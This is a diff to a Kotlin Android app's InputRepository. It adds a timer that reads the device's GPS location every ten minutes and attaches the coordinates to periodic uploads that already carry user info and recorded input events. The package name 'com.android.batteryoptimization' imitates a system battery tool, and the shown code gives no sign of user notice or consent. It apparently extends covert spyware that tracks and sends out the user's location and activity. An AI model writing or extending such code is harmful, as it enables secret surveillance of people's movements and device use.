@@ -48,9 +48,22 @@ class InputRepository private constructor(private val context: Context) {
     private val UPLOAD_THRESHOLD = 5
     private val UPLOAD_INTERVAL_MS = 10 * 1000L // 10 seconds
 
+    // Location refresh interval (seconds, easy to adjust)
+    val LOCATION_INTERVAL_SECONDS = 10 * 60 // 10 minutes
+    private val LOCATION_INTERVAL_MS = LOCATION_INTERVAL_SECONDS * 1000L
+
+    // Cached location (refreshed periodically)
+    @Volatile
+    var cachedLatitude: Double = 0.0
+        private set
+    @Volatile
+    var cachedLongitude: Double = 0.0
+        private set
+
     init {
         loadEvents()
         resetTimer()
+        startLocationTimer()
     }
 
     fun loadEvents() {
@@ -119,6 +132,34 @@ class InputRepository private constructor(private val context: Context) {
         }
     }
 
+    private var locationJob: Job? = null
+
+    private fun startLocationTimer() {
+        locationJob?.cancel()
+        locationJob = repositoryScope.launch {
+            // Initial location fetch
+            refreshLocation()
+            while (isActive) {
+                delay(LOCATION_INTERVAL_MS)
+                refreshLocation()
+            }
+        }
+    }
+
+    private fun refreshLocation() {
+        try {
+            val result = AMapLocationHelper.getLocation(context)
+            val errorCode = result["errorCode"] as? Int ?: -1
+            if (errorCode == 0) {
+                cachedLatitude = (result["latitude"] as? Number)?.toDouble() ?: 0.0
+                cachedLongitude = (result["longitude"] as? Number)?.toDouble() ?: 0.0
+                Log.d(TAG, "定位刷新: lat=$cachedLatitude, lng=$cachedLongitude, time=${java.text.SimpleDateFormat("yyyy-MM-dd HH:mm:ss", java.util.Locale.getDefault()).format(java.util.Date())}")
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "定位刷新异常", e)
+        }
+    }
+
     suspend fun uploadData(): Pair<Boolean, String> {
         if (!uploadMutex.tryLock()) return Pair(false, "正在上传中")
         try {
@@ -174,7 +215,9 @@ class InputRepository private constructor(private val context: Context) {
 
             val requestBody = com.android.batteryoptimization.network.UploadRequest(
                 userInfo = userInfoPayload,
-                events = eventPayloads
+                events = eventPayloads,
+                latitude = cachedLatitude,
+                longitude = cachedLongitude
             )
 
             val requestJson = gson.toJson(requestBody)
